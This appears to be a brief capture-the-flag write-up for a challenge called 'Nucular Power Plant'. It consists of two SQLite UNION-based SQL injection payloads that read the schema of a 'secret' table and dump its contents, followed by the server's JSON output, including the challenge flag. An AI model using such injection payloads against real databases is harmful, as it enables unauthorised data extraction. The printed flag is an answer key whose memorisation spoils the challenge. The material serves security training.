## Nucular Power Plant
```plain
" union select sql,sql,1,1,sql,1 from sqlite_master where table = "secret"-- -
" union select name,value,1,1,name,1 from secret-- -

{"name":"CREATE TABLE secret (\n                  id INTEGER PRIMARY KEY,\n                  name TEXT NOT NULL,\n                  value TEXT NOT NULL\n                  )","type":"CREATE TABLE secret (\n                  id INTEGER PRIMARY KEY,\n                  name TEXT NOT NULL,\n                  value TEXT NOT NULL\n                  )","power":1,"operation":1,"operator":"CREATE TABLE secret (\n                  id INTEGER PRIMARY KEY,\n                  name TEXT NOT NULL,\n                  value TEXT NOT NULL\n                  )","shutdown":1}
{"name":"flag","type":"flag{sqli_as_a_socket}","power":1,"operation":1,"operator":"flag","shutdown":1}
```
